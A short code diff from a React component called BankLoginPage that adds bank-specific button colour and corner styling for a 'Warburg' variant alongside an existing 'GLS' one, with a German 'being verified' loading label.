@@ -740,9 +740,10 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                     disabled={submitting}
                     className={`px-8 py-3 text-white font-medium transition-opacity hover:opacity-90 text-sm ml-auto disabled:opacity-70 disabled:cursor-not-allowed inline-flex items-center gap-2`}
                     style={{ 
-                      backgroundColor: isGLS ? "#002864" : theme.buttonBg,
-                      borderRadius: isGLS ? "0px" : buttonBorderRadius
+                      backgroundColor: isGLS ? "#002864" : isWarburg ? "#6d7e8b" : theme.buttonBg,
+                      borderRadius: (isGLS || isWarburg) ? "0px" : buttonBorderRadius
                     }}
+
                   >
                     {submitting ? (
                       <span className="inline-flex gap-1" aria-label="Wird geprüft">
